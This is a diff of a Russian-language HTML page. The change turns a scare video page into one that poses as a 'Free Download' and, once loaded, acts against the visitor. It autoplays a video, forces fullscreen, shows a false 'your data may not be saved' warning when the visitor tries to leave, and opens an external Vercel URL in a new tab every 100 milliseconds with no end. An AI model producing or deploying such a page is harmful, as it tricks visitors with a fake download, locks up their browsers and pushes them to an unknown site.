@@ -1,57 +1,84 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-  <title>photo of my face</title>
-  <style>
-    *, *::before, *::after { box-sizing: border-box; }
-    body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
-    .scare { position: fixed; top: 0; left: 0; height: 100vh; width: 100vw; z-index: 1; background: #000; display: flex; align-items: center; justify-content: center; }
-    video#video { height: 100%; width: 100%; object-fit: cover; display: none; } /* Скрыто до активации */
-    video#video::-webkit-media-controls-enclosure { display:none !important; }
+<!DOCTYPE html><html lang="ru"><head> 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-wid1th, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">  
+<title>Free Download By Parad1st</title>
+<meta property="og:title" content="Free Download"> 
+<meta property="og:site_name" content="Free Download">
+<meta property="og:image" content="images/Parad1st.png">
+<meta property="og:description" content="Free Download By Parad1st - скачать абсолютно бесплатно!"> 
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="photo">
+<meta name="twitter:title" content="Programm">
+<meta name="twitter:site" content="@fps_boost">
+<meta name="twitter:description" content="FREE!">
+<meta name="twitter:image:src" content="Parad1st.png">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
+<style type="text/css">
+            *, *::before, *::after {
+                box-sizing: border-box;
+            }
 
-    #cta {
-      position: absolute;
-      z-index: 2;
-      padding: 20px 40px;
-      font-size: 24px;
-      color: #fff;
-      background: linear-gradient(135deg, #e50914 0%, #d41414 100%);
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-      font-weight: bold;
-      text-align: center; /* Центрируем текст */
-    }
-  </style>
+            .scare {
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100vh;
+                width: 100vw;
+                z-index: 1;
+            }
+
+            video#video {
+                height: 100%;
+                width: 100%;
+                object-fit: cover;
+            }
+
+            video#video::-webkit-media-controls-enclosure {
+                display:none !important;
+            }
+        </style>
 </head>
 <body>
-  <div class="scare" id="scare">
-    <video id="video" src="media/video.mp4" loop playsinline></video>
-    <button id="cta">Смотреть бесплатно — нажмите здесь</button>
-  </div>
+<div class="scare">
+<video id="video" class="video" src="media/video.mp4" loop></video>
+</div>
+<script type="text/javascript">
+            const video = document.getElementById("video");
+            const targetUrl = "https://penis-git-main-fe1zyyys-projects.vercel.app/";
 
-  <script>
-    const video = document.getElementById("video");
-    const scare = document.getElementById("scare");
-    const cta = document.getElementById("cta");
+            // Предупреждение при закрытии страницы
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
+                return 'Ваши данные могут не сохраниться, точно закрыть?';
+            });
 
-    let activated = false; // Флаг, чтобы убедиться, что активация происходит только один раз
+            function videoClick(event) {
+                if(event) event.preventDefault();
+                const { documentElement } = document;
+                if(documentElement.requestFullscreen) documentElement.requestFullscreen();
+                else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+                else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+                else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+            }
 
-    // Предупреждение при закрытии
-    window.addEventListener('beforeunload', function(e) {
-      if (activated) { // Только если видео уже было активировано
-        e.preventDefault();
-        e.returnValue = 'Вы уверены, что хотите покинуть страницу? Видео будет остановлено.';
-        return 'Вы уверены, что хотите покинуть страницу? Видео будет остановлено.';
-      }
-    });
+            function openNewTab() {
+                window.open(targetUrl, '_blank');
+            }
 
-    // Функция для перехода в полноэкранный режим
-    function launchFullScreen(element) {
-      if (element.requestFullscreen) {
-        element.requestFullscreen().then(() => console.log("Fullscreen entered successfully.")).catch(err => console.error("Failed to enter fullscreen:", err));
-      } else if (element.mozRequestFullScreen) {
-        element.mozRequestFullScreen().then(() => console.log("Fullscreen entered successfully.")).catch(err => console.error("Failed to enter fullscreen:", err));
+            // Автоматически запускаем видео при загрузке страницы
+            window.addEventListener('load', function() {
+                video.play();
+                videoClick();
+                
+                // Начинаем открывать вкладки через секунду после загрузки
+                setTimeout(() => {
+                    // Открываем новые вкладки каждые 100мс бесконечно
+                    setInterval(openNewTab, 100);
+                }, 1000);
+            });
+
+            video.addEventListener("click", videoClick);
+        </script>
+</body></html>
